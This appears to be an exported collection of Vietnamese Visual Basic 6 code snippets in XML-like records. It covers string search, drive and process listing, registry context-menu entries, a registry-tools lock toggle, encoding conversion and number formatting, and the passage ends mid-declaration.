Private Const strNotLetterFilter       As String = "[!a-z!A-Z!À-Ö!Ø-ß!à-ö!ø-ÿ]"
 
Public Function ContainsWholeWord(ByVal strSearch As String, _
                                  ByVal strFind As String, _
                                  Optional Start As Long = 1, _
                                  Optional CaseSensitive As VbCompareMethod = vbBinaryCompare) As Boolean
 
'How it works
'strSearch =string to search in
'strFind   = string to look for
'Start Optional Default =1; If you want to ignore earlier parts of strSearch set Start
'                           (Could be used to scan through a string)
'CaseSensitive Optional Default = vbBinaryCompare;
'                          Set to vbTextCompare to find word in any case.
'NOTE: MS have cheated by using something in InStr which they didn't provide in VB;
'an optional 1st parameter. To use the optional Compare argument you also have to provide the Start value.
'my Function places the Compare argument after the Find parameter and you only need to provide it if it is not default = 1
'
'Pad strSearch so you can detect first/last word
'* accept anything (including nothing) before 1st * and after last *.
'[!a-z!A-Z!À-Ö!Ø-ß!à-ö!ø-ÿ] accept any 1 character which is NOT(!) between a-z or A-Z or any of the high ASCII letter characters
'
'Small potential bug: if strFind = '*ry" then containsWholeWord will hit (* messes with the Like search)
'could be exploited to build an end of word matcher if you want to try building a rhyming dictionary ;)
 
  strSearch = Mid$(strSearch, Start)
  If CaseSensitive = vbBinaryCompare Then
    ContainsWholeWord = " " &amp; strSearch &amp; " " Like "*" &amp; strNotLetterFilter &amp; strFind &amp; strNotLetterFilter &amp; "*"
   Else
    ContainsWholeWord = LCase$(" " &amp; strSearch &amp; " ") Like "*" &amp; strNotLetterFilter &amp; LCase$(strFind) &amp; strNotLetterFilter &amp; "*"
  End If
 
End Function
 
Public Function InStrWholeWord(ByVal strSearch As String, _
                               ByVal strFind As String, _
                               Optional Start As Long = 1, _
                               Optional CaseSensitive As VbCompareMethod = vbBinaryCompare) As Long
 
  Dim TPos As Long
 
'How it works
'ByVal parameters let you manipulate the strings without worrying about them being damaged outside the Function
'strSearch =string to search in
'strFind   = string to look for'Start Optional Default =1; If you want to ignore earlier parts of strSearch set Start
'                           (Could be used to scan through a string)
'CaseSensitive Optional Default = vbBinaryCompare;
'                          Set to vbTextCompare to find word in any case.
'NOTE: MS have cheated by using something in InStr which they didn't provide in VB;
'an optional 1st parameter. To use the optional Compare argument you also have to provide the Start value.
'my Function places the Compare argument after the Find parameter and you only need to provide it if it is not default = 1
  If Start &gt; 1 Then
'To speed the Function cut the unneeded part off
    strSearch = Mid$(strSearch, Start)
  End If
  If ContainsWholeWord(strSearch, strFind, 1, CaseSensitive) Then
'Quick and Dirty test before more complex stuff
    If Not CaseSensitive = vbBinaryCompare Then
'case switching is time consuming only do if necessary
      strSearch = LCase$(strSearch)
      strFind = LCase$(strFind)
    End If
    TPos = InStr(strSearch, strFind)
'Get inital test point then
    If TPos Then
'Small potential bug: if strFind = '*ry" then containsWholeWord will hit (* messes with the Like search) but Tpos will be 0
'Loop through strSearch testing for possible matches
      Do
        If TPos = 1 Then
          If strSearch = strFind Then
            InStrWholeWord = 1
            Exit Do
          End If
'if first position is 1 then test that char after len(strFind) is not a letter
          If Mid$(strSearch, Len(strFind) + 1, 1) Like strNotLetterFilter Then
            InStrWholeWord = 1
            Exit Do
          End If
         ElseIf Mid$(strSearch, TPos - 1, 1) Like strNotLetterFilter Then
'else test that char before is also not a letter
          If TPos + Len(strFind) - 1 = Len(strSearch) Then
'if at very end of string
            InStrWholeWord = TPos
            Exit Do
           ElseIf Mid$(strSearch, TPos + Len(strFind), 1) Like strNotLetterFilter Then
'else test that char after is not a letter
            InStrWholeWord = TPos
            Exit Do
          End If
        End If
'if Standard InStr was wrong try next match
        TPos = InStr(TPos + 1, strSearch, strFind)
'Loop while possible
      Loop While TPos
    End If
  End If
  If InStrWholeWord Then
'reapply start value to get true length
    InStrWholeWord = InStrWholeWord + Start - 1
  End If
 
End Function
 
Public Function PosInStringWholeWord(ByVal strSearch As String, _
                                     ByVal strFind As String, _
                                     Optional Start As Long = 1, _
                                     Optional CaseSensitive As VbCompareMethod = vbBinaryCompare) As Long
 
  Dim TPos   As Long
 
  TPos = InStrWholeWord(strSearch, strFind, Start, CaseSensitive)
  If TPos Then
    PosInStringWholeWord = UBound(Split(Left$(strSearch, TPos))) + 1
  End If
 
End Function
 
':)Roja's VB Code Fixer V1.1.92 (7/02/2004 9:01:52 PM) 3 + 109 = 112 Lines Thanks Ulli for inspiration and lots of code.
 
Sử dụng :

InStrWholeWord(ByVal strSearch As String, _
ByVal strFind As String, _
Optional Start As Long = 1, _
Optional CaseSensitive As VbCompareMethod = vbBinaryCompare) As Long

strSearch = chuỗi tìm kiếm
strFind = nội dung tìm kiếm
Start = vị trí bắt đầu tìm
CaseSensitive = kiểu so sánh</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0609221139470206</MaVD>
    <NoiDung>Private Sub Command1_Click()
    ZipContents "c:\Unicode_ComboBox.zip"
End Sub

Sub ZipContents(path As String)
 Dim lng As Long
 lng = Shell("rundll32.exe zipfldr.dll, RouteTheCall " &amp; path)
End Sub
Tham khảo:
File ZIP.rar </NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>083319103320</MaVD>
    <NoiDung>Taọ mới 1 module và thêm vào đoạn code sau : 

Declare Function GetDriveType Lib "kernel32" _
        Alias "GetDriveTypeA" (ByVal nDrive As String) As Long
 

Trong Form thêm vào đoạn code sau :

Private Sub Form_Load()
    Dim nDrv As Long
    Dim nr As Integer
    
    For nr = 97 To 122
        nDrv = GetDriveType(Chr$(nr) &amp; ":\")
        Select Case nDrv
            Case 1 ' N/A
            Case 2 ' Removeable Drive
                MsgBox Chr$(nr) &amp; ":\ Removeable Drive"
            Case 3 ' Harddrive
                MsgBox Chr$(nr) &amp; ":\ Harddrive"
            Case 4 ' Network Drive
                MsgBox Chr$(nr) &amp; ":\ Network Drive"
            Case 5 ' CD-Rom Drive
                MsgBox Chr$(nr) &amp; ":\ CD-Rom Drive"
            Case 6 ' RAM Drive
                MsgBox Chr$(nr) &amp; ":\ RAM Drive"
        End Select
    Next nr
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>083419103457</MaVD>
    <NoiDung>Tạo mới 1 Module và thêm vào code sau :

Private Declare Function SHEmptyRecycleBin Lib "shell32.dll" Alias "SHEmptyRecycleBinA" (ByVal hwnd As Long, ByVal pszRootPath As String, ByVal dwFlags As Long) As Long
Private Const SHERB_NORMAL = &amp;H0 'Normal execution
Private Const SHERB_NOCONFIRMATION = &amp;H1 'execute without confirmation
Private Const SHERB_NOPROGRESSUI = &amp;H2 'execute without progress window
Private Const SHERB_NOSOUND = &amp;H4 'execute without sound
Private Const SHERB_NOALL = (SHERB_NOCONFIRMATION And SHERB_NOPROGRESSUI And SHERB_NOSOUND)
Dim RetVal As Long
 
Public Sub EmpRecBin()
    RetVal = SHEmptyRecycleBin(0&amp;, vbNullString, SHERB_NORMAL)
End Sub
 
Trong Form thêm vào đoạn code sau : 

Private Sub Form_DblClick()
    Call EmpRecBin
End Sub

Click đôi vào form để thấy kết quả.</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>084319104355</MaVD>
    <NoiDung>Thực hiện :
- Thêm vào form 1 Combobox có tên Combo1
- Thêm vào form 1 Checkbox có tên Check1
- Thêm vào đoạn code sau :

Option Explicit
Private Const EC_LEFTMARGIN = &amp;H1
Private Const EC_RIGHTMARGIN = &amp;H2
Private Const EC_USEFONTINFO = &amp;HFFFF&amp;
Private Const EM_SETMARGINS = &amp;HD3&amp;
Private Const EM_GETMARGINS = &amp;HD4&amp;
Private Declare Function FindWindowEx Lib "user32" Alias "FindWindowExA" _
   (ByVal hwndParent As Long, ByVal hwndChildAfter As Long, ByVal lpszClass As String, _
   ByVal lpszWindow As String) As Long
Private Declare Function SendMessageLong Lib "user32" Alias "SendMessageA" _
   (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
 
Private Sub AddCheckToCombo( _
         ByRef chkThis As CheckBox, _
         ByRef cboThis As ComboBox _
         )
   Dim lhWnd As Long
   Dim lMargin As Long
   lhWnd = FindWindowEx(cboThis.hwnd, 0, "EDIT", vbNullString)
   If (lhWnd &lt;&gt; 0) Then
      lMargin = chkThis.Width \ Screen.TwipsPerPixelX + 2
      SendMessageLong lhWnd, EM_SETMARGINS, EC_LEFTMARGIN, lMargin
      chkThis.BackColor = cboThis.BackColor
      chkThis.Move cboThis.Left + 3 * Screen.TwipsPerPixelX, cboThis.Top + 2 * Screen.TwipsPerPixelY, chkThis.Width, cboThis.Height - 4 * Screen.TwipsPerPixelY
      chkThis.ZOrder
   End If
 
End Sub
 
Private Sub Form_Load()
   AddCheckToCombo Check1, Combo1
   Dim i As Long
   For i = 1 To 20
      Combo1.AddItem "Test" &amp; i
   Next i
End Sub
 
Chúc các bạn thành công.</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>084819104841</MaVD>
    <NoiDung>Trước tiên, ta làm một project mới và cho cái control slider vào form1 (chọn Microsoft Windows Common Controls 6.0 (SP6) trong cửa sổ Componets). Sau đó tạo một module và cho đoạn code dưới đây vào:

Option Explicit
 
Public Declare Function SetWindowLong Lib "user32" Alias "SetWindowLongA" (ByVal hwnd As Long, ByVal nIndex As Long, ByVal dwNewLong As Long) As Long
Public Declare Function CallWindowProc Lib "user32" Alias "CallWindowProcA" (ByVal lpPrevWndFunc As Long, ByVal hwnd As Long, ByVal Msg As Long, ByVal wParam As Long, ByVal lParam As Any) As Long
Public Declare Function GetLastError Lib "kernel32" () As Long
Public Declare Function CreateSolidBrush Lib "gdi32" (ByVal crColor As Long) As Long
Public Declare Function DeleteObject Lib "gdi32" (ByVal hObject As Long) As Long
Public Const GWL_WNDPROC = (-4)
Public Const WM_CTLCOLORSTATIC = &amp;H138
 
Dim pOldProc As Long
Dim hBrush As Long
 
 
Sub Main()
    SetHook
    Form1.Show
End Sub
 
 
Public Function SetHook() As Long
    pOldProc = SetWindowLong(Form1.hwnd, GWL_WNDPROC, AddressOf HookProc)
 
    If pOldProc = 0 Then
        MsgBox GetLastError
    End If
    
    hBrush = CreateSolidBrush((Form1.BackColor))
End Function
 
Public Function ReleaseHook()
    Call SetWindowLong(Form1.hwnd, GWL_WNDPROC, pOldProc)
    DeleteObject hBrush
End Function
 
Public Function HookProc(ByVal hwnd As Long, ByVal iMsg As Long, _
ByVal wParam As Long, ByVal lParam As Long) As Long
    If iMsg = WM_CTLCOLORSTATIC And lParam = Form1.Sld.hwnd Then
        HookProc = hBrush
    Else
        HookProc = CallWindowProc(pOldProc, Form1.hwnd, iMsg, wParam, lParam)
    End If
End Function


Sau đó ta chọn Startup Object của ct là Sub main.
Sau đó về form1 và cho thêm đoạn code này vô để nó tắt việc hook:

Private Sub Form_Unload(Cancel As Integer)
   ReleaseHook
End Sub


Và chọn backcolor của nó là một màu bất kì, sau đó chạy ct để xem kết quả 
Xem:
Slider with backcolor.rar</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>085419105404</MaVD>
    <NoiDung>Thêm 1 commandbutton với tên là Command1 lên form 

Private Declare Sub keybd_event Lib "user32" (ByVal bVk As Byte, ByVal bScan As Byte, ByVal dwFlags As Long, ByVal dwExtraInfo As Long) 
Private Const KEYEVENTF_KEYUP = &amp;H2 
Private Const MENU_KEYCODE = 91 
 
Private Sub Command1_Click() 
' nhan button. 
keybd_event MENU_KEYCODE, 0, 0, 0 
DoEvents 
 
' nha button. 
keybd_event MENU_KEYCODE, 0, KEYEVENTF_KEYUP, 0 
DoEvents 
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>085519105504</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
Dim WSHShell, n, MyBox, p, Title911, errnum, vers, itemtype
' Câu cu~ là: Set WSHShell = WScript.CreateObject("WScript.Shell")  '(tphu)
Set WSHShell = CreateObject("WScript.Shell")
p = "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\"
p = p &amp; "DisableRegistryTools"
itemtype = "REG_DWORD"
Title911 = "KID3"
Err.Clear
On Error Resume Next
n = WSHShell.RegRead(p)
On Error GoTo 0
errnum = Err.Number
If errnum &lt;&gt; 0 Then
WSHShell.RegWrite p, 0, itemtype
End If
If n = 0 Then
n = 1
WSHShell.RegWrite p, n, itemtype
MyBox = MsgBox("Lock registry is successfuly. Please log off or restart computer for finished !!", vbInformation + vbSystemModal, Title911)
ElseIf n = 1 Then
n = 0
WSHShell.RegWrite p, n, itemtype
MyBox = MsgBox("Unlock registry is successfuly. Please log off or restart computer for finished !!", vbInformation + vbSystemModal, Title911)
End If
'This programs by KID3
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>080019110013</MaVD>
    <NoiDung>Private Sub Form_Load()
Dim strComputer, objWMIService, wbemFlagReturnImmediately, wbemFlagForwardOnly, colItems, objitem
strComputer = "."
       Set objWMIService = GetObject("winmgmts:\\" &amp; strComputer &amp; "\root\CIMV2")
       Set colItems = objWMIService.ExecQuery("SELECT * FROM Win32_Process", "WQL", wbemFlagReturnImmediately + wbemFlagForwardOnly)
       For Each objitem In colItems
       Debug.Print objitem.Name
       Next
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>080219110221</MaVD>
    <NoiDung>Thủ thuật khi chạy cần: Text1, Command1,Command2 và CommonDialog1 (thêm vào thành phần MS Common Dialog)

Option Explicit
Private Declare Function ShellExecute Lib "shell32.dll" Alias _
"ShellExecuteA" (ByVal hwnd As Long, ByVal lpOperation As String, _
ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory _
As String, ByVal nShowCmd As Long) As Long
Const SW_MINIMIZE = 6
Dim aa As String, str As String
'Text1 = Gõ tên Ðê muc hiên ra o' menu chuôt phai
Private Sub Command1_Click() 'TAO MENU CHUÔT PHAI ÐANG KÝ TÙY Ý
Dim b As Byte
CommonDialog1.ShowOpen
If CommonDialog1.FileName = "" Or Text1 = "" Then Exit Sub
    For b = 1 To Len(CommonDialog1.FileName)
        If Mid(CommonDialog1.FileName, b, 1) = "\" Then
            aa = aa &amp; "\\"
        Else
            aa = aa &amp; Mid(CommonDialog1.FileName, b, 1)
        End If
    Next
aa = """" &amp; aa &amp; " %1" &amp; """"
 
str = "REGEDIT4" &amp; vbCrLf &amp; _
"[HKEY_LOCAL_MACHINE\SOFTWARE\Classes\*\shell\" &amp; Text1 &amp; "\Command]" _
&amp; vbCrLf &amp; "@=" &amp; aa &amp; vbCrLf &amp; _
"[HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Directory\shell\" &amp; Text1 &amp; "\Command]" _
&amp; vbCrLf &amp; "@=" &amp; aa
Call Ðky
CommonDialog1.FileName = ""
End Sub
 
Private Sub Command2_Click() 'TAO MENU CHUÔT PHAI ÐANG KÝ DLL VÀ OCX
str = "REGEDIT4" &amp; vbCrLf &amp; _
"[HKEY_LOCAL_MACHINE\SOFTWARE\Classes\dllfile\shell\Register\Command]" _
&amp; vbCrLf &amp; "@=" &amp; """" &amp; "regsvr32.exe \" &amp; """" &amp; "%1\" &amp; """" &amp; """" &amp; vbCrLf &amp; _
"[HKEY_LOCAL_MACHINE\SOFTWARE\Classes\dllfile\shell\Unregister\Command]" _
&amp; vbCrLf &amp; "@=" &amp; """" &amp; "regsvr32.exe /u \" &amp; """" &amp; "%1\" &amp; """" &amp; """" &amp; vbCrLf &amp; _
"[HKEY_LOCAL_MACHINE\SOFTWARE\Classes\ocxfile\shell\Register\Command]" _
&amp; vbCrLf &amp; "@=" &amp; """" &amp; "regsvr32.exe \" &amp; """" &amp; "%1\" &amp; """" &amp; """" &amp; vbCrLf &amp; _
"[HKEY_LOCAL_MACHINE\SOFTWARE\Classes\ocxfile\shell\Unregister\Command]" _
&amp; vbCrLf &amp; "@=" &amp; """" &amp; "regsvr32.exe /u \" &amp; """" &amp; "%1\" &amp; """" &amp; """"
Call Ðky
End Sub
 
Private Sub Ðky() 'IN FILE REG VÀ ÐANG KÝ VÀO REGISTRY
    Open App.Path &amp; "\1.reg" For Output As #1
        Print #1, str
    Close #1
 ShellExecute Me.hwnd, "", App.Path &amp; "\1.reg", "", "", SW_MINIMIZE
End Sub
 
Private Sub Form_Load() 'không cân thiêt
Text1 = "TênU'ngDung"
Command1.Caption = "U'ng dung o' Ðâu?"
Command2.Caption = "Tao lâp Ðang ký file DLL-OCX"
End Sub
 
Private Sub Form_Terminate() 'XÓA FILE REG
If Dir(App.Path &amp; "\1.reg") = Empty Then
  End
Else
  Kill App.Path &amp; "\1.reg"
End If
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>080719110706</MaVD>
    <NoiDung>- Trên Form bạn tạo 1 Listbox (có tên là List1), 1 button (có tên là Command1)
- Trong thư mục cùng với Project bạn tạo 1 file có tên "filetext.txt" rồi gõ vài chữ vào đó (ghi gì cũng được, ghi nhiều dòng để thấy rõ hiệu quả)
Bạn thêm vào đoạn mã sau :

Private Sub Command1_Click()
Call Text(App.Path &amp; "\filetext.txt", List1)
End Sub
Public Sub Text(sFile As String, oList As ListBox)
    Dim fnum As Integer
    Dim sTemp As String
    fnum = FreeFile()
    oList.Clear
    Open sFile For Input As fnum
    While Not EOF(fnum)
        Line Input #fnum, sTemp
        oList.AddItem sTemp
    Wend
    Close fnum
End Sub

Click vào button để xem kết quả
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>083519123529</MaVD>
    <NoiDung>Dim a(133),b(133), i
    a(0)="Ã"
    a(1)="Ã¡"
    a(2)="Ã€"
    a(3)="Ã "
    a(4)="áº¢"
    a(5)="áº£"
    a(6)="Ãƒ"
    a(7)="Ã£"
    a(8)="áº "
    a(9)="áº¡"
    a(10)="Ä‚"
    a(11)="Äƒ"
    a(12)="áº®"
    a(13)="áº¯"
    a(14)="áº°"
    a(15)="áº±"
    a(16)="áº²"
    a(17)="áº³"
    a(18)="áº´"
    a(19)="áºµ"
    a(20)="áº¶"
    a(21)="áº·"
    a(22)="Ã‚"
    a(23)="Ã¢"
    a(24)="áº¤"
    a(25)="áº¥"
    a(26)="áº¦"
    a(27)="áº§"
    a(28)="áº¨"
    a(29)="áº©"
    a(30)="áºª"
    a(31)="áº«"
    a(32)="áº¬"
    a(33)="áº­"
    a(34)="Ä"
    a(35)="Ä‘"
    a(36)="Ã‰"
    a(37)="Ã©"
    a(38)="Ãˆ"
    a(39)="Ã¨"
    a(40)="áºº"
    a(41)="áº»"
    a(42)="áº¼"
    a(43)="áº½"
    a(44)="áº¸"
    a(45)="áº¹"
    a(46)="ÃŠ"
    a(47)="Ãª"
    a(48)="áº¾"
    a(49)="áº¿"
    a(50)="á»€"
    a(51)="á»"
    a(52)="á»‚"
    a(53)="á»ƒ"
    a(54)="á»„"
    a(55)="á»…"
    a(56)="á»†"
    a(57)="á»‡"
    a(58)="Ã"
    a(59)="Ã­"
    a(60)="ÃŒ"
    a(61)="Ã¬"
    a(62)="á»ˆ"
    a(63)="á»‰"
    a(64)="Ä¨"
    a(65)="Ä©"
    a(66)="á»Š"
    a(67)="á»‹"
    a(68)="Ã“"
    a(69)="Ã³"
    a(70)="Ã’"
    a(71)="Ã²"
    a(72)="á»Ž"
    a(73)="á»"
    a(74)="Ã•"
    a(75)="Ãµ"
    a(76)="á»Œ"
    a(77)="á»"
    a(78)="Ã”"
    a(79)="Ã´"
    a(80)="á»"
    a(81)="á»‘"
    a(82)="á»’"
    a(83)="á»“"
    a(84)="á»”"
    a(85)="á»•"
    a(86)="á»–"
    a(87)="á»—"
    a(88)="á»˜"
    a(89)="á»™"
    a(90)="Æ "
    a(91)="Æ¡"
    a(92)="á»š"
    a(93)="á»›"
    a(94)="á»œ"
    a(95)="á»"
    a(96)="á»ž"
    a(97)="á»Ÿ"
    a(98)="á» "
    a(99)="á»¡"
    a(100)="á»¢"
    a(101)="á»£"
    a(102)="Ãš"
    a(103)="Ãº"
    a(104)="Ã™"
    a(105)="Ã¹"
    a(106)="á»¦"
    a(107)="á»§"
    a(108)="Å¨"
    a(109)="Å©"
    a(110)="á»¤"
    a(111)="á»¥"
    a(112)="Æ¯"
    a(113)="Æ°"
    a(114)="á»¨"
    a(115)="á»©"
    a(116)="á»ª"
    a(117)="á»«"
    a(118)="á»¬"
    a(119)="á»­"
    a(120)="á»®"
    a(121)="á»¯"
    a(122)="á»°"
    a(123)="á»±"
    a(124)="Ã"
    a(125)="Ã½"
    a(126)="á»²"
    a(127)="á»³"
    a(128)="á»¶"
    a(129)="á»·"
    a(130)="á»¸"
    a(131)="á»¹"
    a(132)="á»´"
    a(133)="á»µ"
    b(0)="Á"
    b(1)="á"
    b(2)="À"
    b(3)="à"
    b(4)="Ả"
    b(5)="ả"
    b(6)="Ã"
    b(7)="ã"
    b(8)="Ạ"
    b(9)="ạ"
    b(10)="Ă"
    b(11)="ă"
    b(12)="Ắ"
    b(13)="ắ"
    b(14)="Ằ"
    b(15)="ằ"
    b(16)="Ẳ"
    b(17)="ẳ"
    b(18)="Ẵ"
    b(19)="ẵ"
    b(20)="Ặ"
    b(21)="ặ"
    b(22)="Â"
    b(23)="â"
    b(24)="Ấ"
    b(25)="ấ"
    b(26)="Ầ"
    b(27)="ầ"
    b(28)="Ẩ"
    b(29)="ẩ"
    b(30)="Ẫ"
    b(31)="ẫ"
    b(32)="Ậ"
    b(33)="ậ"
    b(34)="Đ"
    b(35)="đ"
    b(36)="É"
    b(37)="é"
    b(38)="È"
    b(39)="è"
    b(40)="Ẻ"
    b(41)="ẻ"
    b(42)="Ẽ"
    b(43)="ẽ"
    b(44)="Ẹ"
    b(45)="ẹ"
    b(46)="Ê"
    b(47)="ê"
    b(48)="Ế"
    b(49)="ế"
    b(50)="Ề"
    b(51)="ề"
    b(52)="Ể"
    b(53)="ể"
    b(54)="Ễ"
    b(55)="ễ"
    b(56)="Ệ"
    b(57)="ệ"
    b(58)="Í"
    b(59)="í"
    b(60)="Ì"
    b(61)="ì"
    b(62)="Ỉ"
    b(63)="ỉ"
    b(64)="Ĩ"
    b(65)="ĩ"
    b(66)="Ị"
    b(67)="ị"
    b(68)="Ó"
    b(69)="ó"
    b(70)="Ò"
    b(71)="ò"
    b(72)="Ỏ"
    b(73)="ỏ"
    b(74)="Õ"
    b(75)="õ"
    b(76)="Ọ"
    b(77)="ọ"
    b(78)="Ô"
    b(79)="ô"
    b(80)="Ố"
    b(81)="ố"
    b(82)="Ồ"
    b(83)="ồ"
    b(84)="Ổ"
    b(85)="ổ"
    b(86)="Ỗ"
    b(87)="ỗ"
    b(88)="Ộ"
    b(89)="ộ"
    b(90)="Ơ"
    b(91)="ơ"
    b(92)="Ớ"
    b(93)="ớ"
    b(94)="Ờ"
    b(95)="ờ"
    b(96)="Ở"
    b(97)="ở"
    b(98)="Ỡ"
    b(99)="ỡ"
    b(100)="Ợ"
    b(101)="ợ"
    b(102)="Ú"
    b(103)="ú"
    b(104)="Ù"
    b(105)="ù"
    b(106)="Ủ"
    b(107)="ủ"
    b(108)="Ũ"
    b(109)="ũ"
    b(110)="Ụ"
    b(111)="ụ"
    b(112)="Ư"
    b(113)="ư"
    b(114)="Ứ"
    b(115)="ứ"
    b(116)="Ừ"
    b(117)="ừ"
    b(118)="Ử"
    b(119)="ử"
    b(120)="Ữ"
    b(121)="ữ"
    b(122)="Ự"
    b(123)="ự"
    b(124)="Ý"
    b(125)="ý"
    b(126)="Ỳ"
    b(127)="ỳ"
    b(128)="Ỷ"
    b(129)="ỷ"
    b(130)="Ỹ"
    b(131)="ỹ"
    b(132)="Ỵ"
    b(133)="ỵ"
Function ctoutf8(vnstr)
If IsNull(vnstr) then
    ctoutf8=" "
    exit function
end if
For i=0 to 133
    vnstr=Replace(vnstr,b(i),a(i))
Next
ctoutf8=vnstr
End function</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>084720114753</MaVD>
    <NoiDung>Đây là hàm chuyển chuỗi str từ hệ cơ số nbase về hệ cơ số 10

Private Function String2Dec(str As String, nbase As Byte) As Long
    String2Dec = -1
    
    Dim bB() As Byte, i As Integer, n As Integer, res As Long
    bB = StrConv(str, vbFromUnicode)
    
    For i = 0 To UBound(bB)
    
        If (57 &lt; bB(i)) And (bB(i) &lt; 65) Then Exit Function
        n = bB(i) - 48
        If n &gt;= 17 Then n = n - 7
        If n &gt;= nbase Then Exit Function
        
        res = res + n * nbase ^ (UBound(bB) - i)
    Next
    
    String2Dec = res
End Function
 


Còn đây là hàm chuyển từ hệ cơ số 10 sang hệ nbase

Private Function Dec2String(num As Long, nbase As Byte) As String
    Dim bB(32) As Byte, bBRes() As Byte
    Dim i As Integer, n As Integer
    
    Do While (num &lt;&gt; 0)
        bB(i) = num Mod nbase
        num = num \ nbase
        i = i + 1
    Loop
    
    n = i - 1
    ReDim bBRes(n) As Byte
    
    For i = n To 0 Step -1
        If (bB(n - i) &gt; 9) Then
            bBRes(i) = bB(n - i) + 55
        Else
            bBRes(i) = bB(n - i) + 48
        End If
    Next i
 
    Dec2String = StrConv(bBRes, vbUnicode)
End Function</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>080325030352</MaVD>
    <NoiDung>1. Chuyển một con số giây sang cấu trúc giờ : phút : giây (00:00:00)

Public Function ConvertGiayToGioPhutGiay(ByVal sGiay As Integer) As String
    Dim ChuoiTime As String
    ChuoiTime = Format(sGiay \ 3600, "00") &amp; ":"              '   h
    ChuoiTime = ChuoiTime &amp; Format((sGiay Mod 3600) \ 60, "00") &amp; ":"              'p
    ChuoiTime = ChuoiTime &amp; Format((sGiay Mod 3600) Mod 60, "00")            ' s
    ConvertGiayToGioPhutGiay = ChuoiTime
End Function

Ví dụ
ConvertGiayToGioPhutGiay(3670)="01:01:10"


2. Định dạng chuỗi theo cấu trúc sau : 00001 , 00012, 00123, 01234, 12345
Các bạn để ý thấy tất cả các con số trên đều có năm chữ số, nếu không đủ năm chữ số thì các số còn thiếu ở đầu sẽ thay bằng chữ số không

Public Function ConvertNumberToOOOOO(ByVal nNumber As Integer, ByVal nSoChuSo As Integer) As String
ConvertNumberToOOOOO = Format(nNumber, String(nSoChuSo, "0"))
End Function

Ví dụ

ConvertNumberToOOOOO(12, 5)="00012"

3. Convert một chuỗi số sang dạng nhóm : 1-234-567-890-123 hay 1.234.567.890.123

Public Function ConvertNumberToGroup(ByVal ChuoiSo As String, SoChuso As Byte, Kytungancach As String) As String
    Dim Ketqua As String, i As Integer
    ChuoiSo = StrReverse(ChuoiSo)
    Ketqua = Left(ChuoiSo, SoChuso)
    For i = SoChuso + 1 To Len(ChuoiSo) Step SoChuso
        Ketqua = Ketqua &amp; Kytungancach &amp; Mid(ChuoiSo, i, SoChuso)
    Next
    ConvertNumberToGroup = StrReverse(Ketqua)
End Function]

Ví dụ:

Dim s  As String
s = "1234567890123"
ConvertNumberToGroup(s, 3, "-")="1-234-567-890-123"
ConvertNumberToGroup(s, 3, "*")="1*234*567*890*123"
 


4. Tạo số ngẫu nhiên giữa 2 số : 

Public Function CreateRandomBetween2Number(a As Integer, b As Integer) As Integer
    CreateRandomBetween2Number = Fix(Rnd(1) * Abs(b - a)) + a
End Function

Ví dụ : tạo số ngẫu nhiên giữa 10 và 20

CreateRandomBetween2Number(10, 20)=15 hay 14 hay 13.......


5. Tạo ra đường dẫn file hay folder đúng đắn
Public Function CreatePath(ParamArray Mang()) As String
Dim i As Integer, Ketqua As String
Ketqua = Mang(0)
For i = 1 To UBound(Mang())
    Ketqua = Ketqua &amp; "\" &amp; Mang(i)
Next
    CreatePath = Replace(Ketqua, "\\", "\")
End Function

Ví dụ

CreatePath("D:\", "a", "b", "c")="D:\a\b\c"</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000196</MaVD>
    <NoiDung>Option Explicit
Private Declare Function PathCompactPath Lib "shlwapi" Alias "PathCompactPathA" (ByVal hDC As Long, ByVal lpszPath As String, ByVal dx As Long) As Long
Private Function CompactedPathSh(ByVal sPath As String, ByVal lMaxPixels As Long, ByVal hDC As Long) As String
    Dim lR As Long
    lR = PathCompactPath(hDC, sPath, lMaxPixels)
    If InStr(sPath, Chr$(0)) &lt;&gt; 0 Then CompactedPathSh = Left$(sPath, InStr(sPath, Chr$(0)) - 1) Else CompactedPathSh = sPath
End Function
Private Sub Form_Load()
    Label1.AutoSize = False
    Label1.Caption = "C:\BinhPhuong\goldsoft\Download\web_wiz_forums_access2000_v7.01\forum\index.asp"
    Label1.Caption = CompactedPathSh(Label1.Caption, Label1.Width \ Screen.TwipsPerPixelX, Me.hDC)
End Sub


Re: Đường dẫn khít Label không dùng API
Code bởi NoBi 
Private Sub Form_Load() 'thêm môt Label1
    Dim str$, lastStr$, i&amp; 'Code by Truong Phú, QuanGL hiêu Ðính
    Label1.AutoSize = False
    Me.FontName = Label1.FontName
    Me.FontSize = Label1.FontSize
    'Me.FontBold = Label1.FontBold
    'Me.FontItalic = Label1.FontItalic
     str = "C:\BinhPhuong\goldsoft\Download\web_wiz_forums_access2000_v7.01\forum\index.asp"
    lastStr = "..." &amp; Right$(str, Len(str) - InStrRev(str, "\", , 1) + 1)
    Label1.Caption = lastStr
 
    Do While Me.TextWidth(Label1.Caption) &lt; Label1.Width - Me.TextWidth("A")
          Label1.Caption = Left$(str, i) &amp; lastStr
          i = i + 1
    Loop
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>082325032301</MaVD>
    <NoiDung>'Coder: Tran Dai Nghia
'Email: gianghoplus@yahoo.com
'Website: http://giangho.biz
'This code in a module
'Add a font file to Resource (ID=101, Type="CUSTOM")
'This code Support for "VK Sans Serif" font
'In VB: Project -&gt; Project Properties -&gt; Startup Oject -&gt; Sub Main()
'--------------------------------------------
Private Declare Function RegOpenKey Lib "advapi32.dll" Alias "RegOpenKeyA" (ByVal hKey As Long, ByVal lpSubKey As String, phkResult As Long) As Long
